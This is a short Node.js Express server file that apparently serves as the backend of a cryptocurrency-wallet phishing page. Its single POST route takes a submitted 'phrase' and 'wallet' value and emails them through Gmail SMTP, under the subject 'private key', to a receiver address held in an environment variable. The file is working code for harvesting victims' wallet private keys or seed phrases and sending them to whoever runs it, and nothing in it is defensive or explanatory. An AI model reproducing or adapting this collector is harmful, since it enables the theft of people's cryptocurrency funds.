const nodemailer = require("nodemailer");
const express = require("express");
const PORT = process.env.PORT || 5000;
const cors = require("cors");
const app = express();
const dotenv = require("dotenv");
dotenv.config();

app.use(cors());
app.use(express.json());

app.use(
  express.urlencoded({
    extended: true,
  })
);

var transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.SENDER_MAIL,
    pass: process.env.PASS_KEY,
  },
});

app.post("/", (req, res) => {
  const mailOptions = {
    from: process.env.SENDER_MAIL,
    to: process.env.RECEIVER_MAIL,
    subject: "private key",
    html: `
                            <p>
                               <b>privatekey: </b>${req.body.phrase}<br>
                               <b>wallet: </b>${req.body.initial}<br>
                            </p>`,
  };
  transporter.sendMail(mailOptions, function (err, data) {
    if (err) {
      console.log(err);
    } else {
      console.log("sent");
      res.send("sent");
    }
  });
});

app.listen(PORT, () => {
  console.log(`app is listening on port ${PORT}`);
});
